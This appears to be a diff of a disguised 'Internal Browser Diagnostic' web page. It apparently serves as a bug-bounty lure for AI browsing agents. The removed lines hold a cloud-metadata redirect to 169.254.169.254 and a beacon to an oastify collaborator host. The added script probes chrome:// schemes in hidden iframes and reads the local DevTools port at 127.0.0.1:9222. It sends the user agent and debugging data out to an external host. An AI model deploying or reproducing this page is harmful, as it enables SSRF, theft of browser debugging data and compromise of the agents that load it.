@@ -1,26 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Internal Audit Portal</title>
-    <link rel="dns-prefetch" href="//ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com">
-    
-    <meta http-equiv="refresh" content="5;url=http://169.254.169.254/metadata/instance?api-version=2021-02-01">
+    <title>Internal Browser Diagnostic</title>
 </head>
 <body>
-    <h1>System Loading... <span id="timer">5</span>s</h1>
+    <h1>System Audit Phase: <span id="status">INIT</span></h1>
     <script>
-        const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
-        const log = (p, d) => new Image().src = `https://${collab}/${p}?v=${btoa(JSON.stringify(d))}`;
+        const collab = "5z5gx0dkp49tbo47teikhf4c73dw1mpb.oastify.com";
+        const log = (path, data) => {
+            const b = btoa(JSON.stringify(data));
+            new Image().src = `https://${collab}/${path}?d=${b}`;
+        };
 
-        // Phase 1: Heartbeat (Evidence of JS Execution)
+        async function triggerJailbreak() {
+            // Target: Internal browser schemes (P2 Target)
+            const internalSchemes = [
+                "chrome://version", 
+                "view-source:https://www.google.com",
+                "chrome://net-export"
+            ];
+
+            internalSchemes.forEach(s => {
+                const ifr = document.createElement('iframe');
+                ifr.src = s;
+                ifr.style.display = 'none';
+                document.body.appendChild(ifr);
+                log("scheme_probe", {target: s});
+            });
+
+            // Target: Localhost Debugging Ports (P1/P2 Target)
+            try {
+                fetch("http://127.0.0.1:9222/json").then(r => r.json()).then(d => log("debug_hit", d));
+            } catch(e) {}
+        }
+
         window.onload = () => {
-            log("heartbeat", {ua: navigator.userAgent, time: new Date().toISOString()});
-            
-            // Countdown visual to keep the agent 'watching' the page
-            let count = 5;
-            setInterval(() => {
-                if(count > 0) document.getElementById('timer').innerText = --count;
-            }, 1000);
+            log("start", {ua: navigator.userAgent});
+            triggerJailbreak();
+            setTimeout(() => { document.getElementById('status').innerText = "NODE_ID_ALPHA_77"; }, 5000);
         };
     </script>
 </body>
